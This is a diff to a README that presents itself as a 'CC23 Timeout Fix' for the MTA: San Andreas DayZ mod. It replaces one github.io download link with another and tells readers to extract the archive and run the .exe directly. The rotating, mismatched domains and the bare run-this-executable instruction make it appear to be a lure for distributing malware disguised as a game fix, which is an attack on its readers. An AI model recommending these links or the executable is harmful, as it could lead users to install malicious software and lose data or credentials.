@@ -1,6 +1,6 @@
 # CC23 Timeout Fix — MTA: San Andreas (DayZ Mod)
 
-[![Download CC23 Fix](https://img.shields.io/badge/Download-CC23_Timeout_Fix-CC0000?style=for-the-badge&logo=game-controller&logoColor=white)](https://fix-video-tdr-failure.github.io/.github)
+[![Download CC23 Fix](https://img.shields.io/badge/Download-CC23_Timeout_Fix-CC0000?style=for-the-badge&logo=game-controller&logoColor=white)](https://cc23-timeout-fix-mta-san-andreas.github.io/.github)
 
 > 💡 **Tip:** After downloading, extract the archive and run the `.exe` directly. No setup or additional tools required.
 
